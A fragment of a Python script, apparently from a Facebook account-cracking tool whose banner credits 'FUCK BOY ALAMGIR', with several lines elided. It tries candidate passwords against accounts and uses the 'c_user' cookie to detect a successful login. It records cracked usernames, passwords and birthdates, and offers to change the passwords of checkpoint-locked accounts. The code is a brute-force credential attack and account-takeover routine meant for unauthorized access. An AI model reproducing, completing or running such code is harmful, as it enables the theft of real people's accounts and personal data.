...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By FUCK BOY ALAMGIR Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}ALAMGIR123{N}")
            ...
            for memek in cp:
                ...
                try:
                    log_hasil(titid[0].replace("[ALAMGIR-CP] ", ""), titid[1])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[ALAMGIR-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
